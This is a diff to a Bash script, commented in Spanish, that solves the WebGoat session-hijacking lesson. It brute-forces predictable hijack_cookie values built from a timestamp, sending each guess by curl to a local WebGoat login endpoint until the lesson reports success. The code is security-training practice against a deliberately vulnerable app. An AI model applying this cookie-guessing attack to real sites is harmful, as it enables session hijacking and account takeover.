@@ -32,6 +32,19 @@ do
 			marca_temporal=$((parte2_tmp-i))
 			hijack_cookie_temp="hijack_cookie=$parte1_aumt-$marca_temporal"
 			echo "$hijack_cookie_temp"
+			salida=$(curl -v -s -k -X  'POST' \
+			-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+			-H "Cookie: JSESSIONID=$1; $hijack_cookie_temp;"  \
+			--data-raw $'username=foo&password=bar' \
+			'http://localhost:8080/WebGoat/HijackSession/login')
+			lessonCompleted=$(echo $salida | jq -r '.lessonCompleted')
+
+			if ($lessonCompleted); then
+				echo "Listo! la cookie era $hijack_cookie_temp"
+				echo $salida | jq .
+				else
+				printf '\nNope!\n\n'
+			fi
 		done		
 	  	break
 	else
